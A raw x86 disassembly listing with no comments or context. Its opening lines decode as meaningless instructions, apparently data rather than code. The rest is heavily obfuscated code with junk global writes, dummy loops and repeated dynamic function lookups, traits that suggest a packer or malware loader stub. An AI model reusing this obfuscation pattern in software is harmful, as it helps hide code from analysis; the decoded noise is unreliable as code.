  420515:	fisttp WORD PTR [ebp-0x29f81e76]
  42051b:	std    
  42051c:	jl     0x4204b8
  42051e:	les    edi,FWORD PTR ss:[ecx+0x701f6e8f]
  420525:	test   edx,ecx
  420527:	push   eax
  420528:	cmc    
  420529:	pop    ebx
  42052a:	je     0x420530
  42052c:	inc    esi
  42052d:	cli    
  42052e:	ret    0x57bb
  420531:	sub    bl,BYTE PTR [edi+esi*1-0x5c2e1c17]
  420538:	mov    eax,0xf1fcdb6f
  42053d:	mov    al,ah
  42053f:	inc    ebx
  420540:	push   eax
  420541:	int    0xfe
  420543:	and    eax,DWORD PTR [edi+esi*4+0x56edf092]
  42054a:	jle    0x4205ab
  42054c:	mov    BYTE PTR [eax-0x11a9bed],cl
  420552:	and    bl,BYTE PTR [ebp-0x8]
  420555:	jne    0x42054b
  420557:	mov    ecx,0xf28c9dfe
  42055c:	aaa    
  42055d:	and    ebp,edi
  42055f:	add    ecx,DWORD PTR [ebx]
  420561:	pop    es
  420562:	push   edi
  420563:	loope  0x420517
  420565:	xchg   BYTE PTR [eax-0x65],dh
  420568:	in     al,dx
  420569:	mov    DWORD PTR [edi+esi*8],edi
  42056c:	or     BYTE PTR [ebx-0x179d508a],0x3e
  420573:	lods   al,BYTE PTR ds:[esi]
  420574:	inc    esi
  420575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420576:	outs   dx,BYTE PTR ds:[esi]
  420577:	inc    eax
  420578:	push   0x3a
  42057a:	sub    eax,0x5c6406e9
  42057f:	pop    esp
  420580:	pop    es
  420581:	xchg   ecx,eax
  420582:	inc    ecx
  420583:	mov    ebx,ebx
  420585:	jo     0x42054f
  420587:	jbe    0x42050b
  420589:	gs inc esp
  42058b:	retf   
  42058c:	inc    BYTE PTR [edx]
  42058e:	xlat   BYTE PTR ds:[ebx]
  42058f:	cmp    BYTE PTR [bp+di-0x7556],cl
  420594:	in     al,0x76
  420596:	iret   
  420597:	xchg   ecx,eax
  420598:	add    ecx,edx
  42059a:	in     eax,dx
  42059b:	nop
  42059c:	fst    DWORD PTR [eax]
  42059e:	mov    eax,0xf5cd9bf7
  4205a3:	stc    
  4205a4:	adc    DWORD PTR [ebp-0x64],esp
  4205a7:	jno    0x42052e
  4205a9:	cmp    DWORD PTR [ebx+esi*8+0x3],eax
  4205ad:	mov    ch,0x2f
  4205af:	adc    cl,BYTE PTR [ecx]
  4205b1:	xor    al,cl
  4205b3:	or     eax,0xa802d51
  4205b8:	test   eax,0x492b0ff0
  4205bd:	pop    ss
  4205be:	leave  
  4205bf:	or     al,dh
  4205c1:	or     ah,BYTE PTR [ebp+0x0]
  4205c4:	pop    eax
  4205c5:	sbb    eax,0x124b907e
  4205ca:	leave  
  4205cb:	push   ebp
  4205cc:	lods   eax,DWORD PTR ds:[esi]
  4205cd:	inc    esp
  4205ce:	and    bh,BYTE PTR [edi-0x38e958de]
  4205d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205d5:	pop    edi
  4205d6:	call   0x6d56cbf0
  4205db:	push   0xffffffcd
  4205dd:	xchg   ebx,eax
  4205de:	mov    ds:0xdfd6426f,al
  4205e3:	jmp    0xfb8d0642
  4205e8:	xchg   ebp,eax
  4205e9:	sub    BYTE PTR [esi-0x76],dl
  4205ec:	sub    DWORD PTR [ebp+0x15],edi
  4205ef:	xor    ah,BYTE PTR [edx]
  4205f1:	gs ja  0x420668
  4205f4:	xchg   ecx,eax
  4205f5:	cmp    al,0x81
  4205f7:	pushf  
  4205f8:	or     DWORD PTR [eax-0x6c9ef5d9],ecx
  4205fe:	pop    edi
  4205ff:	mov    BYTE PTR [ebp+0x67c8e8ce],dl
  420605:	(bad)  
  420606:	push   cs
  420607:	outs   dx,DWORD PTR ds:[esi]
  420608:	or     eax,0xe31f1acd
  42060d:	arpl   WORD PTR es:[ebp+0x6039cd5],si
  420614:	lods   al,BYTE PTR ds:[esi]
  420615:	jne    0x4205c5
  420617:	call   0xe401:0xdbffb372
  42061e:	(bad)  
  42061f:	loopne 0x42065b
  420621:	das    
  420622:	fwait
  420623:	pxor   mm0,QWORD PTR [ecx]
  420626:	push   ds
  420627:	out    0x25,eax
  420629:	outs   dx,DWORD PTR ds:[esi]
  42062a:	jne    0x4205c3
  42062c:	adc    edi,DWORD PTR [edi]
  42062e:	ror    DWORD PTR [ebx+0x5d],0xf
  420632:	mov    dh,bh
  420634:	xor    eax,0x3a7a5ab3
  420639:	xor    bl,BYTE PTR [esi-0x25]
  42063c:	in     al,dx
  42063d:	mov    esi,0xfefd86d7
  420642:	call   0x32e595cb
  420647:	xchg   esp,eax
  420648:	ret    0x6584
  42064b:	sti    
  42064c:	loopne 0x4205d6
  42064e:	inc    ebp
  42064f:	addr16 mov bl,bh
  420652:	mov    al,BYTE PTR [eax+0x1d]
  420655:	rcl    DWORD PTR [edi-0x80],0xa0
  420659:	daa    
  42065a:	mov    ebx,0xffddddba
  42065f:	mov    eax,ds:0x8aad4916
  420664:	dec    ecx
  420665:	mov    edi,0xe5f9ee1d
  42066a:	xchg   DWORD PTR ds:0xbf0cbffb,esp
  420670:	inc    edx
  420671:	ficom  WORD PTR [edi+0x6637d4e7]
  420677:	dec    edx
  420678:	cmp    al,0x93
  42067a:	xchg   ebp,eax
  42067b:	stos   DWORD PTR es:[edi],eax
  42067c:	xchg   esi,eax
  42067d:	mov    eax,ds:0xe852fa7
  420682:	pop    edi
  420683:	lods   eax,DWORD PTR ds:[esi]
  420684:	out    0x5e,al
  420686:	mov    eax,ds:0xb954182e
  42068b:	es sub dh,al
  42068e:	inc    ecx
  42068f:	mov    DWORD PTR [ebp+edx*2-0x4c7c641e],esp
  420696:	cvttps2pi mm5,QWORD PTR [ebx-0x43]
  42069a:	mov    bh,cl
  42069c:	shr    eax,1
  42069e:	scas   al,BYTE PTR es:[edi]
  42069f:	loope  0x42063b
  4206a1:	inc    ebp
  4206a2:	mov    esi,0x898f93be
  4206a7:	sbb    DWORD PTR [edx],edx
  4206a9:	and    ebp,0xcb4ed636
  4206af:	jb     0x4206d0
  4206b1:	int    0x4d
  4206b3:	mov    ch,0x59
  4206b5:	shr    BYTE PTR [eax],cl
  4206b7:	cmp    dl,bl
  4206b9:	call   0x559cce7c
  4206be:	pop    ebx
  4206bf:	pop    ss
  4206c0:	jmp    0x4206a6
  4206c2:	or     al,cl
  4206c4:	pop    ebp
  4206c5:	ror    edi,0x16
  4206c8:	inc    ebx
  4206c9:	pop    esp
  4206ca:	dec    esi
  4206cb:	xchg   ebx,eax
  4206cc:	xchg   ecx,eax
  4206cd:	push   es
  4206ce:	add    eax,0x2923fe2f
  4206d3:	cmp    DWORD PTR [ecx],edx
  4206d5:	inc    edx
  4206d6:	aas    
  4206d7:	adc    eax,0x6e30a397
  4206dc:	loop   0x4206e5
  4206de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206df:	add    al,0xb8
  4206e1:	push   cs
  4206e2:	lds    ecx,FWORD PTR fs:[eax-0x9738163]
  4206e9:	xchg   esi,eax
  4206ea:	jb     0x420675
  4206ec:	jge    0x4206d2
  4206ee:	mov    edi,DWORD PTR [ebp+0x8]
  4206f1:	xor    edi,ecx
  4206f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4206f6:	add    edi,edx
  4206f8:	cmp    ecx,edi
  4206fa:	je     0x42073c
  420700:	mov    ecx,DWORD PTR [ebp-0x18]
  420703:	add    ecx,eax
  420705:	mov    DWORD PTR [ebp-0x1c],ecx
  420708:	mov    ecx,DWORD PTR [ebp-0x30]
  42070b:	mov    edx,DWORD PTR [ebp-0x2c]
  42070e:	mov    edx,0xa143
  420713:	xor    cx,dx
  420716:	mov    edx,DWORD PTR [ebp-0x1c]
  420719:	mov    edx,DWORD PTR [edx+0xc]
  42071c:	add    cx,si
  42071f:	cmp    WORD PTR [eax+edx*1],cx
  420723:	jne    0x42073c
  420729:	mov    ecx,DWORD PTR ds:0x428373
  42072f:	mov    ecx,DWORD PTR [ecx+0x198]
  420735:	mov    DWORD PTR [ecx],eax
  420737:	jmp    0x420797
  42073c:	push   DWORD PTR [ebp+0x1c]
  42073f:	push   DWORD PTR [ebp+0x18]
  420742:	jmp    0x420786
  420747:	mov    eax,DWORD PTR [ebp+0x18]
  42074a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42074d:	cmp    eax,0x70941f99
  420752:	jne    0x42076b
  420758:	cmp    ecx,ebx
  42075a:	jne    0x42076b
  420760:	push   ebx
  420761:	push   0x70941f9f
  420766:	jmp    0x420786
  42076b:	mov    eax,DWORD PTR [ebp+0x18]
  42076e:	mov    ecx,DWORD PTR [ebp+0x1c]
  420771:	cmp    eax,0x70941f9f
  420776:	jne    0x420797
  42077c:	cmp    ecx,ebx
  42077e:	jne    0x420797
  420784:	push   ebx
  420785:	push   edi
  420786:	push   DWORD PTR [ebp+0x14]
  420789:	push   DWORD PTR [ebp+0x10]
  42078c:	push   DWORD PTR [ebp+0xc]
  42078f:	push   DWORD PTR [ebp+0x8]
  420792:	call   0x41b999
  420797:	pop    edi
  420798:	pop    esi
  420799:	pop    ebx
  42079a:	leave  
  42079b:	ret    0x18
  42079e:	push   ebp
  42079f:	mov    ebp,esp
  4207a1:	and    esp,0xfffffff8
  4207a4:	adc    DWORD PTR ds:0x428e9f,0x428e5f
  4207ae:	sub    esp,0xcc
  4207b4:	push   ebx
  4207b5:	push   esi
  4207b6:	adc    DWORD PTR ds:0x428ecb,0x428e7f
  4207c0:	push   edi
  4207c1:	lea    eax,[esp+0x58]
  4207c5:	push   eax
  4207c6:	mov    BYTE PTR [esp+0xda],0x0
  4207ce:	and    DWORD PTR ds:0x428e83,0x428eb7
  4207d8:	call   DWORD PTR ds:0x42a9f7
  4207de:	mov    DWORD PTR ds:0x428e9f,0x6fab
  4207e8:	mov    al,ds:0x428498
  4207ed:	cmp    al,BYTE PTR ds:0x4284a9
  4207f3:	mov    DWORD PTR ds:0x428e27,0x607e
  4207fd:	je     0x42081a
  420803:	push   0x0
  420805:	xor    DWORD PTR ds:0x428e63,0x595a
  42080f:	call   DWORD PTR ds:0x42a9b3
  420815:	jmp    0x42188d
  42081a:	mov    DWORD PTR ds:0x428e37,0x550e
  420824:	mov    al,ds:0x4284b5
  420829:	mov    DWORD PTR ds:0x428e27,0x154d
  420833:	cmp    al,BYTE PTR ds:0x4284c6
  420839:	mov    DWORD PTR ds:0x428e47,0x193
  420843:	je     0x420850
  420849:	xor    eax,eax
  42084b:	jmp    0x42188d
  420850:	mov    edi,DWORD PTR ds:0x42a9c7
  420856:	adc    DWORD PTR ds:0x428e8b,0x1314
  420860:	push   0x4284cf
  420865:	push   0x4284db
  42086a:	call   edi
  42086c:	adc    DWORD PTR ds:0x428ea3,0x428e9f
  420876:	test   eax,eax
  420878:	je     0x420849
  42087e:	and    DWORD PTR ds:0x428e6f,edx
  420884:	mov    DWORD PTR [esp+0x30],0x0
  42088c:	adc    esi,0x6be4
  420892:	mov    ecx,0xf89c85a5
  420897:	mov    DWORD PTR [esp+0x20],ecx
  42089b:	mov    ebx,DWORD PTR ds:0x428ecf
  4208a1:	add    DWORD PTR ds:0x428e8f,ebx
  4208a7:	mov    DWORD PTR [esp+0xc],0xf89c85a4
  4208af:	lea    eax,[esp+0x3c]
  4208b3:	mov    DWORD PTR [esp+0x30],eax
  4208b7:	lea    eax,[esp+0x38]
  4208bb:	mov    DWORD PTR [esp+0x18],eax
  4208bf:	mov    eax,ds:0x428373
  4208c4:	mov    ebx,DWORD PTR ds:0x428edf
  4208ca:	mov    esi,DWORD PTR ds:0x42a07b
  4208d0:	sub    esi,ebx
  4208d2:	or     ebx,DWORD PTR [ebx+esi*1]
  4208d5:	mov    eax,DWORD PTR [eax+0x1c8]
  4208db:	mov    eax,DWORD PTR [eax]
  4208dd:	and    DWORD PTR ds:0x428eaf,0x0
  4208e7:	mov    ebx,DWORD PTR ds:0x428eaf
  4208ed:	inc    ebx
  4208ee:	mov    DWORD PTR ds:0x428eaf,ebx
  4208f4:	cmp    DWORD PTR ds:0x428eaf,0x2d
  4208fb:	jle    0x42091e
  420901:	jmp    0x420911
  420906:	push   0x428189
  42090b:	call   DWORD PTR ds:0x42a9cb
  420911:	cmp    DWORD PTR ds:0x428eaf,0x1d
  420918:	jb     0x4208e7
  42091e:	mov    edx,DWORD PTR [esp+0x18]
  420922:	sub    DWORD PTR ds:0x428e37,0x428e2f
  42092c:	mov    esi,0x75108af
  420931:	and    DWORD PTR ds:0x428e5f,0x428e8b
  42093b:	xor    eax,esi
  42093d:	mov    DWORD PTR ds:0x428e53,0x1b
  420947:	cmp    DWORD PTR ds:0x428e53,0x0
  42094e:	je     0x42099d
  420954:	cmp    DWORD PTR ds:0x428e53,0x7
  42095b:	jb     0x42099d
  420961:	jmp    0x420971
  420966:	push   0x231a
  42096b:	call   DWORD PTR ds:0x42a9cf
  420971:	cmp    DWORD PTR ds:0x428e53,0x8
  420978:	jne    0x42098b
  42097e:	mov    ebx,DWORD PTR ds:0x428e53
  420984:	dec    ebx
  420985:	mov    DWORD PTR ds:0x428e53,ebx
  42098b:	mov    ebx,DWORD PTR ds:0x428e53
  420991:	dec    ebx
  420992:	mov    DWORD PTR ds:0x428e53,ebx
  420998:	jmp    0x420947
  42099d:	mov    ebx,0x3272f6
  4209a2:	add    eax,ebx
  4209a4:	mov    DWORD PTR ds:0x428ec3,0x767b
  4209ae:	mov    DWORD PTR [edx],eax
  4209b0:	mov    eax,ds:0x428cef
  4209b5:	mov    DWORD PTR ds:0x428e5f,0x7551
  4209bf:	cmp    eax,0x455dedfa
  4209c4:	mov    DWORD PTR ds:0x428e9f,0x7198
  4209ce:	jne    0x420a43
  4209d4:	or     DWORD PTR ds:0x428e3b,edi
  4209da:	mov    eax,DWORD PTR [esp+0x20]
  4209de:	mov    edx,DWORD PTR ds:0x428373
  4209e4:	mov    DWORD PTR ds:0x428e63,0x33b4
  4209ee:	mov    edx,DWORD PTR [edx+0x198]
  4209f4:	xor    eax,esi
  4209f6:	inc    DWORD PTR ds:0x428e6b
  4209fc:	add    eax,ebx
  4209fe:	mov    DWORD PTR [edx],eax
  420a00:	mov    eax,DWORD PTR [esp+0x20]
  420a04:	xor    DWORD PTR ds:0x428e57,0x1a38
  420a0e:	xor    eax,esi
  420a10:	add    eax,ebx
  420a12:	adc    DWORD PTR ds:0x428e23,0x304d
  420a1c:	mov    ds:0x428cef,eax
  420a21:	and    eax,0x47de
  420a26:	mov    eax,DWORD PTR [esp+0x20]
  420a2a:	adc    DWORD PTR ds:0x428e9b,0x428e27
  420a34:	xor    eax,esi
  420a36:	add    eax,ebx
  420a38:	inc    DWORD PTR ds:0x428ebb
  420a3e:	mov    ds:0x42846b,eax
  420a43:	and    DWORD PTR ds:0x428e43,0x0
  420a4d:	mov    eax,ds:0x428e43
  420a52:	inc    eax
  420a53:	mov    ds:0x428e43,eax
  420a58:	cmp    DWORD PTR ds:0x428e43,0x28
  420a5f:	ja     0x420a82
  420a65:	jmp    0x420a75
  420a6a:	push   0x42815b
  420a6f:	call   DWORD PTR ds:0x42a9d3
  420a75:	cmp    DWORD PTR ds:0x428e43,0x1e
  420a7c:	jb     0x420a4d
  420a82:	mov    eax,ds:0x428373
  420a87:	adc    DWORD PTR ds:0x428e9f,0x428e87
  420a91:	mov    eax,DWORD PTR [eax+0x18c]
  420a97:	mov    eax,DWORD PTR [eax]
  420a99:	mov    DWORD PTR [esp+0x40],eax
  420a9d:	mov    eax,0xf89c85a1
  420aa2:	add    DWORD PTR ds:0x428ec3,0x428e3f
  420aac:	mov    DWORD PTR [esp+0x10],eax
  420ab0:	sub    DWORD PTR ds:0x428eab,0x428e2f
  420aba:	mov    DWORD PTR [esp+0x10],eax
  420abe:	and    DWORD PTR ds:0x428e97,0x428e8f
  420ac8:	mov    DWORD PTR [esp+0x10],eax
  420acc:	sub    DWORD PTR ds:0x428e9f,0x428e8f
  420ad6:	mov    DWORD PTR [esp+0x10],ecx
  420ada:	add    DWORD PTR ds:0x428e5b,0x398e
  420ae4:	mov    DWORD PTR [esp+0x18],eax
  420ae8:	adc    DWORD PTR ds:0x428ecb,0x1d27
  420af2:	mov    DWORD PTR [esp+0x18],0xf89c85bd
  420afa:	add    DWORD PTR ds:0x428e83,edi
  420b00:	mov    eax,DWORD PTR [esp+0x20]
  420b04:	sbb    DWORD PTR ds:0x428e5b,0x428ebf
  420b0e:	xor    eax,esi
  420b10:	or     DWORD PTR ds:0x428ebb,0x428e7f
  420b1a:	add    eax,ebx
  420b1c:	mov    DWORD PTR ds:0x428e37,0x4b61
  420b26:	jmp    0x420d1e
  420b2b:	mov    DWORD PTR ds:0x428ea7,0x2827
  420b35:	mov    al,ds:0x4284e8
  420b3a:	mov    DWORD PTR ds:0x428ecb,0x2eff
  420b44:	cmp    al,BYTE PTR ds:0x4284f9
  420b4a:	jne    0x420849
  420b50:	mov    DWORD PTR ds:0x428e3f,0x3779
  420b5a:	mov    al,ds:0x428505
  420b5f:	mov    DWORD PTR ds:0x428e67,0xc1e
  420b69:	cmp    al,BYTE PTR ds:0x428516
  420b6f:	jne    0x420849
  420b75:	or     DWORD PTR ds:0x428e53,0x428ec3
  420b7f:	push   0x42851f
  420b84:	or     DWORD PTR ds:0x428eb7,0x428ebb
  420b8e:	push   0x42852b
  420b93:	sub    DWORD PTR ds:0x428e9f,0x10e
  420b9d:	call   edi
  420b9f:	xor    DWORD PTR ds:0x428e93,0x265a
  420ba9:	test   eax,eax
  420bab:	je     0x420849
  420bb1:	mov    al,ds:0x428538
  420bb6:	mov    DWORD PTR ds:0x428e5f,0x67be
  420bc0:	cmp    al,BYTE PTR ds:0x428549
  420bc6:	mov    DWORD PTR ds:0x428ecb,0x75a8
  420bd0:	jne    0x420849
  420bd6:	mov    DWORD PTR ds:0x428e6f,0x3bcf
  420be0:	mov    al,ds:0x428555
  420be5:	mov    DWORD PTR ds:0x428e6b,0x562a
  420bef:	cmp    al,BYTE PTR ds:0x428566
  420bf5:	jne    0x420849
  420bfb:	adc    DWORD PTR ds:0x428e2f,0x428ec3
  420c05:	push   0x42856f
  420c0a:	add    DWORD PTR ds:0x428ecb,0x428e87
  420c14:	push   0x42857b
  420c19:	call   edi
  420c1b:	and    DWORD PTR ds:0x428e6b,0x4f9f
  420c25:	test   eax,eax
  420c27:	je     0x420849
  420c2d:	sub    eax,DWORD PTR ds:0x428e9b
  420c33:	mov    eax,DWORD PTR [esp+0xc]
  420c37:	mov    ecx,DWORD PTR [esp+0x18]
  420c3b:	add    DWORD PTR ds:0x428e93,0x1aa1
  420c45:	xor    eax,esi
  420c47:	lea    eax,[eax+ecx*1+0x3272f6]
  420c4e:	and    DWORD PTR ds:0x428e5f,0x6940
  420c58:	push   eax
  420c59:	or     eax,DWORD PTR ds:0x428e5b
  420c5f:	mov    eax,DWORD PTR [esp+0x14]
  420c63:	xor    eax,esi
  420c65:	or     DWORD PTR ds:0x428e77,0x428e6f
  420c6f:	lea    eax,[ebp+eax*1+0x3272fe]
  420c76:	adc    DWORD PTR ds:0x428eb7,0x2832
  420c80:	push   eax
  420c81:	mov    eax,ds:0x428373
  420c86:	push   DWORD PTR [eax+0x1bc]
  420c8c:	sbb    DWORD PTR ds:0x428eb7,0x428ebb
  420c96:	call   0x421896
  420c9b:	mov    eax,DWORD PTR [esp+0xc]
  420c9f:	mov    edx,DWORD PTR ds:0x428e9f
  420ca5:	or     edx,DWORD PTR ds:0x428e7b
  420cab:	mov    DWORD PTR ds:0x428e9f,edx
  420cb1:	mov    ecx,DWORD PTR [esp+0x18]
  420cb5:	mov    DWORD PTR ds:0x428e9f,0x15
  420cbf:	cmp    DWORD PTR ds:0x428e9f,0x0
  420cc6:	je     0x420d15
  420ccc:	cmp    DWORD PTR ds:0x428e9f,0x5
  420cd3:	jle    0x420d15
  420cd9:	jmp    0x420ce9
  420cde:	push   0x75d1
  420ce3:	call   DWORD PTR ds:0x42a9d7
  420ce9:	cmp    DWORD PTR ds:0x428e9f,0x6
  420cf0:	jne    0x420d03
  420cf6:	mov    edx,DWORD PTR ds:0x428e9f
  420cfc:	dec    edx
  420cfd:	mov    DWORD PTR ds:0x428e9f,edx
  420d03:	mov    edx,DWORD PTR ds:0x428e9f
  420d09:	dec    edx
  420d0a:	mov    DWORD PTR ds:0x428e9f,edx
  420d10:	jmp    0x420cbf
  420d15:	xor    eax,esi
  420d17:	lea    eax,[ecx+eax*1+0x3272f6]
  420d1e:	and    DWORD PTR ds:0x428ea3,0x0
  420d28:	jmp    0x420d3c
  420d2d:	xor    ecx,ecx
  420d2f:	add    ecx,DWORD PTR ds:0x428ea3
  420d35:	inc    ecx
  420d36:	mov    DWORD PTR ds:0x428ea3,ecx
  420d3c:	cmp    DWORD PTR ds:0x428ea3,0x1b
  420d43:	jae    0x420d83
  420d49:	cmp    DWORD PTR ds:0x428ea3,0x4
  420d50:	jle    0x420d83
  420d56:	jmp    0x420d64
  420d5b:	push   DWORD PTR [ebp-0x18]
  420d5e:	call   DWORD PTR ds:0x42a9db
  420d64:	cmp    DWORD PTR ds:0x428ea3,0x3
  420d6b:	jne    0x420d7e
  420d71:	mov    ecx,DWORD PTR ds:0x428ea3
  420d77:	inc    ecx
  420d78:	mov    DWORD PTR ds:0x428ea3,ecx
  420d7e:	jmp    0x420d2d
  420d83:	mov    ecx,DWORD PTR [esp+0xc]
  420d87:	mov    edx,DWORD PTR [esp+0xc]
  420d8b:	and    DWORD PTR ds:0x428e7f,0x27c9
  420d95:	xor    edx,esi
  420d97:	xor    ecx,esi
  420d99:	add    ecx,edx
  420d9b:	and    DWORD PTR ds:0x428eb7,0x0
  420da5:	mov    edx,DWORD PTR ds:0x428eb7
  420dab:	inc    edx
  420dac:	mov    DWORD PTR ds:0x428eb7,edx
  420db2:	cmp    DWORD PTR ds:0x428eb7,0x23
  420db9:	jg     0x420de1
  420dbf:	jmp    0x420dd4
  420dc4:	push   0x428e3f
  420dc9:	push   0x584f
  420dce:	call   DWORD PTR ds:0x42a9df
  420dd4:	cmp    DWORD PTR ds:0x428eb7,0x1b
  420ddb:	jb     0x420da5
  420de1:	mov    edx,DWORD PTR [esp+0xc]
  420de5:	mov    DWORD PTR ds:0x428e97,0x4e1f
  420def:	xor    edx,esi
  420df1:	lea    ecx,[ecx+edx*1+0x9758e2]
  420df8:	mov    DWORD PTR ds:0x428e83,0x69c
  420e02:	mov    DWORD PTR [esp+0x18],eax
  420e06:	mov    DWORD PTR ds:0x428ebf,0x5f48
  420e10:	cmp    eax,ecx
  420e12:	mov    DWORD PTR ds:0x428e3f,0x5aa0
  420e1c:	jbe    0x420b2b
  420e22:	not    eax
  420e24:	mov    eax,DWORD PTR [ebp+0xc]
  420e27:	and    ecx,0x5ce1
  420e2d:	mov    ds:0x4281f7,eax
  420e32:	mov    eax,DWORD PTR [ebp+0x10]
  420e35:	mov    DWORD PTR ds:0x428e87,0x15
  420e3f:	cmp    DWORD PTR ds:0x428e87,0x0
  420e46:	je     0x420e96
  420e4c:	cmp    DWORD PTR ds:0x428e87,0x6
  420e53:	jb     0x420e96
  420e59:	jmp    0x420e6a
  420e5e:	push   DWORD PTR [ebp-0x14]
  420e61:	push   DWORD PTR [ebp-0x1c]
  420e64:	call   DWORD PTR ds:0x42a9e3
  420e6a:	cmp    DWORD PTR ds:0x428e87,0x7
  420e71:	jne    0x420e84
  420e77:	mov    ecx,DWORD PTR ds:0x428e87
  420e7d:	dec    ecx
  420e7e:	mov    DWORD PTR ds:0x428e87,ecx
  420e84:	mov    ecx,DWORD PTR ds:0x428e87
  420e8a:	dec    ecx
  420e8b:	mov    DWORD PTR ds:0x428e87,ecx
  420e91:	jmp    0x420e3f
  420e96:	mov    ds:0x428453,eax
  420e9b:	mov    eax,ds:0x4281f7
  420ea0:	mov    ecx,DWORD PTR ds:0x428e9b
  420ea6:	adc    ecx,DWORD PTR ds:0x428ec3
  420eac:	mov    DWORD PTR ds:0x428e9b,ecx
  420eb2:	mov    ecx,DWORD PTR [esp+0x30]
  420eb6:	sub    eax,ebx
  420eb8:	xor    eax,esi
  420eba:	mov    DWORD PTR ds:0x428ecb,0x2418
  420ec4:	mov    DWORD PTR [ecx],eax
  420ec6:	mov    DWORD PTR ds:0x428e97,0x6c0e
  420ed0:	lea    eax,[esp+0x2c]
  420ed4:	mov    DWORD PTR [esp+0x44],eax
  420ed8:	mov    DWORD PTR ds:0x428ea3,0x17d
  420ee2:	lea    eax,[ebp+0x4]
  420ee5:	mov    DWORD PTR [esp+0x2c],eax
  420ee9:	mov    DWORD PTR ds:0x428ec3,0x4441
  420ef3:	mov    al,ds:0x428588
  420ef8:	cmp    al,BYTE PTR ds:0x428599
  420efe:	mov    DWORD PTR ds:0x428e47,0x46bb
  420f08:	jne    0x420849
  420f0e:	mov    al,ds:0x4285a5
  420f13:	cmp    al,BYTE PTR ds:0x4285b6
  420f19:	mov    DWORD PTR ds:0x428eaf,0x61de
  420f23:	jne    0x420849
  420f29:	mov    DWORD PTR ds:0x428ea7,0xc38
  420f33:	push   0x4285bf
  420f38:	sbb    DWORD PTR ds:0x428e8b,0x428e7f
  420f42:	push   0x4285cb
  420f47:	call   edi
  420f49:	test   eax,eax
  420f4b:	mov    DWORD PTR ds:0x428e4b,0x74a1
  420f55:	je     0x420849
  420f5b:	mov    al,ds:0x4285d8
  420f60:	mov    DWORD PTR ds:0x428e27,0x62c3
  420f6a:	cmp    al,BYTE PTR ds:0x4285e9
  420f70:	jne    0x420849
  420f76:	mov    DWORD PTR ds:0x428e5b,0x5f7d
  420f80:	mov    al,ds:0x4285f5
  420f85:	mov    DWORD PTR ds:0x428e3b,0x1797
  420f8f:	cmp    al,BYTE PTR ds:0x428606
  420f95:	jne    0x420849
  420f9b:	push   0x42860f
  420fa0:	add    DWORD PTR ds:0x428ebf,0x428eab
  420faa:	push   0x42861b
  420faf:	call   edi
  420fb1:	test   eax,eax
  420fb3:	je     0x420849
  420fb9:	mov    DWORD PTR ds:0x428e67,0x333a
  420fc3:	mov    al,ds:0x428628
  420fc8:	cmp    al,BYTE PTR ds:0x428639
  420fce:	jne    0x420849
  420fd4:	mov    DWORD PTR ds:0x428e63,0x2ea7
  420fde:	mov    al,ds:0x428645
  420fe3:	mov    DWORD PTR ds:0x428e83,0x19a
  420fed:	cmp    al,BYTE PTR ds:0x428656
  420ff3:	mov    DWORD PTR ds:0x428ec3,0xb46
  420ffd:	jne    0x420849
  421003:	xor    DWORD PTR ds:0x428e4b,0x428e9b
  42100d:	push   0x42865f
  421012:	xor    DWORD PTR ds:0x428ea7,0x428ebf
  42101c:	push   0x42866b
  421021:	adc    DWORD PTR ds:0x428e7b,0x428e97
  42102b:	call   edi
  42102d:	test   eax,eax
  42102f:	je     0x420849
  421035:	mov    DWORD PTR ds:0x428eab,0x160c
  42103f:	mov    al,ds:0x428678
  421044:	cmp    al,BYTE PTR ds:0x428689
  42104a:	mov    DWORD PTR ds:0x428e33,0x7fda
  421054:	jne    0x420849
  42105a:	mov    DWORD PTR ds:0x428eb3,0x205
  421064:	mov    al,ds:0x428695
  421069:	mov    DWORD PTR ds:0x428ea7,0x1bc1
  421073:	cmp    al,BYTE PTR ds:0x4286a6
  421079:	mov    DWORD PTR ds:0x428e2f,0xcbc
  421083:	jne    0x420849
  421089:	push   0x4286af
  42108e:	xor    DWORD PTR ds:0x428e73,0x428e53
  421098:	push   0x4286bb
  42109d:	call   edi
  42109f:	test   eax,eax
  4210a1:	mov    DWORD PTR ds:0x428e7f,0x3ee2
  4210ab:	je     0x420849
  4210b1:	mov    DWORD PTR ds:0x428e73,0x4aa5
  4210bb:	mov    al,ds:0x4286c8
  4210c0:	mov    DWORD PTR ds:0x428e73,0x2576
  4210ca:	cmp    al,BYTE PTR ds:0x4286d9
  4210d0:	jne    0x420849
  4210d6:	mov    al,ds:0x4286e5
  4210db:	mov    DWORD PTR ds:0x428eab,0x2fd2
  4210e5:	cmp    al,BYTE PTR ds:0x4286f6
  4210eb:	mov    DWORD PTR ds:0x428e77,0x665f
  4210f5:	jne    0x420849
  4210fb:	push   0x4286ff
  421100:	xor    DWORD PTR ds:0x428eab,0x43e0
  42110a:	push   0x42870b
  42110f:	call   edi
  421111:	add    DWORD PTR ds:0x428eaf,0x428e77
  42111b:	test   eax,eax
  42111d:	mov    DWORD PTR ds:0x428e7f,0x618e
  421127:	je     0x420849
  42112d:	mov    al,ds:0x428718
  421132:	mov    DWORD PTR ds:0x428ebb,0x5321
  42113c:	cmp    al,BYTE PTR ds:0x428729
  421142:	jne    0x420849
  421148:	mov    al,ds:0x428735
  42114d:	cmp    al,BYTE PTR ds:0x428746
  421153:	jne    0x420849
  421159:	adc    DWORD PTR ds:0x428ea7,0x4891
  421163:	push   0x42874f
  421168:	xor    DWORD PTR ds:0x428ecb,0x428ec3
  421172:	push   0x42875b
  421177:	call   edi
  421179:	xor    DWORD PTR ds:0x428ecb,0x428e67
  421183:	test   eax,eax
  421185:	mov    DWORD PTR ds:0x428e77,0x34d8
  42118f:	je     0x420849
  421195:	mov    DWORD PTR ds:0x428e63,0x47d8
  42119f:	mov    al,ds:0x428768
  4211a4:	mov    DWORD PTR ds:0x428ebb,0x60f8
  4211ae:	cmp    al,BYTE PTR ds:0x428779
  4211b4:	mov    DWORD PTR ds:0x428e63,0x352f
  4211be:	jne    0x420849
  4211c4:	mov    al,ds:0x428785
  4211c9:	mov    DWORD PTR ds:0x428e37,0x65de
  4211d3:	cmp    al,BYTE PTR ds:0x428796
  4211d9:	mov    DWORD PTR ds:0x428e3f,0x2ba7
  4211e3:	jne    0x420849
  4211e9:	push   0x42879f
  4211ee:	sbb    DWORD PTR ds:0x428e6b,0x25d3
